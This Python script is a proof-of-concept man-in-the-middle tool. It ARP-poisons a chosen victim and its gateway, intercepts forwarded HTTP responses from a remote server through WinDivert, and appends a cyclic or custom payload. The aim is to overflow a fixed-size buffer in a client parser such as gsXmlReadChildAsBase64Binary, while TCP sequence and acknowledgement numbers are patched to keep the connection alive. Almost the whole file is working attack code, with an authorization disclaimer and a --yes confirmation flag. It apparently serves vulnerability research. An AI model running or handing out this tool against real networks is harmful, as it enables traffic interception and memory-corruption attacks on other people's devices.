#!/usr/bin/env python3
"""Proof-of-concept: MITM injector that appends bytes to the tail of an HTTP
response from SOURCE_IP so a client-side parser (e.g. gsXmlReadChildAsBase64Binary)
receives more data than its fixed-size buffer expects.

Intended use: authorized security testing on a lab network you control (e.g. a
console/emulator under test and a test server, both on your own LAN). Do NOT
run this against third-party or production infrastructure, or without explicit
authorization from the network/system owner.

How it works
------------
SOURCE_IP is expected to be a remote server reachable only through your
local router, so ARP spoofing cannot target it directly (ARP only works
within the local L2 segment). Instead:
1. ARP-spoofs VICTIM_IP and GATEWAY_IP (your LAN router) so all of the
   victim's traffic - including traffic to/from the remote SOURCE_IP -
   flows through this host.
2. Uses WinDivert (via pydivert) to intercept forwarded packets, filtering
   on the real SOURCE_IP/VICTIM_IP pair, find the TCP segment(s) carrying
   the HTTP response body, and splice extra bytes onto the end of the last
   segment before it is re-injected onto the wire.
3. Because inserting bytes changes the byte-stream length, every later
   sequence number from SOURCE_IP and every later acknowledgment number from
   VICTIM_IP on that connection is corrected by the injected length (a
   standard TCP stream-splicing technique), and checksums are recalculated.

Requirements
------------
    pip install scapy pydivert
    WinDivert64.sys / WinDivert.dll must be discoverable (see pydivert docs).
    Must be run from an elevated (Administrator) PowerShell/terminal.
    Windows must be configured to actually forward packets (WinDivert's
    NETWORK_FORWARD layer only sees packets the OS has decided to route),
    e.g. enable the "IP Enable Router" registry value or Internet Connection
    Sharing on the interface used.

This script only touches the IPs you configure; it does not scan or spoof
the whole subnet. On exit it restores the real ARP mappings.
"""

from __future__ import annotations

import argparse
import atexit
import signal
import string
import sys
import threading
import time
from dataclasses import dataclass
from typing import Dict, Optional, Tuple

try:
    from scapy.all import ARP, Ether, send, srp
except ImportError:
    print("Missing dependency: pip install scapy", file=sys.stderr)
    raise

try:
    import pydivert
except ImportError:
    print("Missing dependency: pip install pydivert", file=sys.stderr)
    raise


StreamKey = Tuple[str, int, str, int]  # (src_ip, src_port, dst_ip, dst_port)


def cyclic_pattern(length: int) -> bytes:
    """Generate a De Bruijn-style non-repeating pattern (like pwntools' cyclic())
    so a crash address/offset can be uniquely mapped back to a buffer offset."""
    alphabet = (string.ascii_uppercase + string.ascii_lowercase + string.digits).encode()
    n = len(alphabet)
    subseq_len = 4
    a = [0] * (n * subseq_len)
    sequence = bytearray()

    def de_bruijn(t: int, p: int):
        if len(sequence) >= length:
            return
        if t > subseq_len:
            if subseq_len % p == 0:
                sequence.extend(alphabet[i] for i in a[1:p + 1])
        else:
            a[t] = a[t - p]
            de_bruijn(t + 1, p)
            for j in range(a[t - p] + 1, n):
                if len(sequence) >= length:
                    return
                a[t] = j
                de_bruijn(t + 1, t)

    de_bruijn(1, 1)
    return bytes(sequence[:length])


@dataclass
class ConnState:
    injected_len: int = 0
    already_injected: bool = False


class ArpSpoofer:
    """Two-way ARP poisoning restricted to exactly gateway_ip <-> victim_ip.

    SOURCE_IP is assumed to be remote (unreachable via ARP); poisoning the
    local gateway instead routes the victim's internet-bound traffic
    (including traffic to/from SOURCE_IP) through this host."""

    def __init__(self, iface: str, gateway_ip: str, victim_ip: str):
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._gateway_mac: Optional[str] = None
        self._victim_mac: Optional[str] = None

    def _resolve_mac(self, ip: str) -> str:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=3, retry=2, iface=self.iface, verbose=False,
        )
        if not ans:
            raise RuntimeError(f"Could not resolve MAC address for {ip}")
        return ans[0][1].hwsrc

    def start(self) -> None:
        self._gateway_mac = self._resolve_mac(self.gateway_ip)
        self._victim_mac = self._resolve_mac(self.victim_ip)
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        atexit.register(self.stop)

    def _loop(self) -> None:
        while not self._stop.is_set():
            # Tell the victim that we are the gateway.
            send(ARP(op=2, pdst=self.victim_ip, hwdst=self._victim_mac,
                      psrc=self.gateway_ip), iface=self.iface, verbose=False)
            # Tell the gateway that we are the victim.
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self._gateway_mac,
                      psrc=self.victim_ip), iface=self.iface, verbose=False)
            self._stop.wait(2)

    def stop(self) -> None:
        if self._stop.is_set():
            return
        self._stop.set()
        if self._gateway_mac and self._victim_mac:
            # Restore correct ARP mappings.
            send(ARP(op=2, pdst=self.victim_ip, hwdst=self._victim_mac,
                      psrc=self.gateway_ip, hwsrc=self._gateway_mac),
                 iface=self.iface, count=3, verbose=False)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self._gateway_mac,
                      psrc=self.victim_ip, hwsrc=self._victim_mac),
                 iface=self.iface, count=3, verbose=False)
        print("[arp] restored original ARP mappings")


class ResponseInjector:
    """Captures forwarded TCP packets between source_ip:80 and victim_ip and
    appends `payload` to the last data segment of the HTTP response, then
    fixes up sequence/ack numbers for the remainder of the connection."""

    def __init__(self, source_ip: str, victim_ip: str, payload: bytes,
                 marker: Optional[bytes] = None):
        self.source_ip = source_ip
        self.victim_ip = victim_ip
        self.payload = payload
        self.marker = marker
        self.streams: Dict[StreamKey, ConnState] = {}
        self._stop = threading.Event()

    def _filter(self) -> str:
        return (
            f"tcp and "
            f"((ip.SrcAddr == {self.source_ip} and ip.DstAddr == {self.victim_ip}) or "
            f" (ip.SrcAddr == {self.victim_ip} and ip.DstAddr == {self.source_ip}))"
        )

    def run(self) -> None:
        with pydivert.WinDivert(self._filter(), layer=pydivert.Layer.NETWORK_FORWARD) as w:
            print(f"[inject] listening: {self._filter()}")
            while not self._stop.is_set():
                packet = w.recv()
                self._handle(packet)
                w.send(packet)

    def stop(self) -> None:
        self._stop.set()

    def _handle(self, packet: "pydivert.Packet") -> None:
        if not packet.tcp:
            return

        from_source = packet.src_addr == self.source_ip and packet.dst_addr == self.victim_ip
        from_victim = packet.src_addr == self.victim_ip and packet.dst_addr == self.source_ip
        if not (from_source or from_victim):
            return

        if from_source:
            key: StreamKey = (packet.src_addr, packet.tcp.src_port,
                               packet.dst_addr, packet.tcp.dst_port)
        else:
            key = (packet.dst_addr, packet.tcp.dst_port,
                   packet.src_addr, packet.tcp.src_port)

        state = self.streams.setdefault(key, ConnState())

        if packet.tcp.fin or packet.tcp.rst:
            # Connection ending: apply any pending delta, then forget the stream.
            if from_source and state.injected_len:
                packet.tcp.seq_num = (packet.tcp.seq_num + state.injected_len) & 0xFFFFFFFF
            elif from_victim and state.injected_len:
                packet.tcp.ack_num = (packet.tcp.ack_num - state.injected_len) & 0xFFFFFFFF
            del self.streams[key]
            packet.recalculate_checksums()
            return

        if from_source:
            should_inject = (
                not state.already_injected
                and packet.tcp.psh
                and len(packet.tcp.payload) > 0
                and (self.marker is None or self.marker in packet.tcp.payload)
            )
            if should_inject:
                packet.tcp.payload = packet.tcp.payload + self.payload
                state.injected_len += len(self.payload)
                state.already_injected = True
                print(f"[inject] appended {len(self.payload)} bytes to "
                      f"{key[0]}:{key[1]} -> {key[2]}:{key[3]}")
            elif state.injected_len:
                packet.tcp.seq_num = (packet.tcp.seq_num + state.injected_len) & 0xFFFFFFFF
        else:  # from_victim: ACKs referencing bytes sent by source
            if state.injected_len:
                packet.tcp.ack_num = (packet.tcp.ack_num - state.injected_len) & 0xFFFFFFFF

        packet.recalculate_checksums()


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--source-ip", required=True, help="IP of the (remote) server whose responses are modified")
    p.add_argument("--victim-ip", required=True, help="IP of the local client receiving the response")
    p.add_argument("--gateway-ip", required=True,
                    help="IP of your local LAN router; ARP-spoofed in place of source-ip since it's remote")
    p.add_argument("--iface", required=True, help="Network interface name used by scapy for ARP spoofing")
    p.add_argument("--payload-size", type=int, default=256,
                    help="Number of extra bytes to append past the expected response length")
    p.add_argument("--payload-hex", default=None,
                    help="Optional exact bytes to append (hex string). Overrides cyclic pattern")
    p.add_argument("--marker", default=None,
                    help="Optional substring (utf-8) that must appear in the response segment before injecting")
    p.add_argument("--yes", action="store_true",
                    help="Confirm you are authorized to test source-ip/victim-ip on this network")
    return p.parse_args()


def main() -> None:
    args = parse_args()

    if not args.yes:
        print("Refusing to run without --yes. Only use this against systems you own "
              "or are explicitly authorized to test.", file=sys.stderr)
        sys.exit(1)

    payload = bytes.fromhex(args.payload_hex) if args.payload_hex else cyclic_pattern(args.payload_size)
    marker = args.marker.encode() if args.marker else None

    spoofer = ArpSpoofer(args.iface, args.gateway_ip, args.victim_ip)
    injector = ResponseInjector(args.source_ip, args.victim_ip, payload, marker)

    def handle_sigint(signum, frame):
        injector.stop()
        spoofer.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    print(f"[*] ARP-spoofing {args.gateway_ip} <-> {args.victim_ip} on {args.iface}")
    spoofer.start()
    time.sleep(1)
    try:
        injector.run()
    finally:
        spoofer.stop()


if __name__ == "__main__":
    main()
